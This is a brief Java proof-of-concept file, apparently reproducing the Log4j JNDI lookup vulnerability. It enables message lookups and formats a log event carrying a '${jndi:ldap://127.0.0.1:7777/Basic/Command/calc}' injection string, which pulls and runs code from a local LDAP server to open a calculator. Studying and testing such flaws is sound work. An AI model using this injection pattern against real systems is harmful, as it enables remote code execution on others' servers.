package org.example;

import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.config.Configuration;
import org.apache.logging.log4j.core.config.DefaultConfiguration;
import org.apache.logging.log4j.core.impl.MutableLogEvent;
import org.apache.logging.log4j.core.pattern.LogEventPatternConverter;
import org.apache.logging.log4j.core.pattern.MessagePatternConverter;
import org.apache.logging.log4j.core.pattern.PatternFormatter;

public class Main {
    public static void main(String[] args) {
        Configuration configuration = new DefaultConfiguration();
        MessagePatternConverter messagePatternConverter = MessagePatternConverter.newInstance(configuration,new String[]{"lookups"});

        LogEvent logEvent = new MutableLogEvent(new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"),null);
        messagePatternConverter.format(logEvent,new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"));
    }
}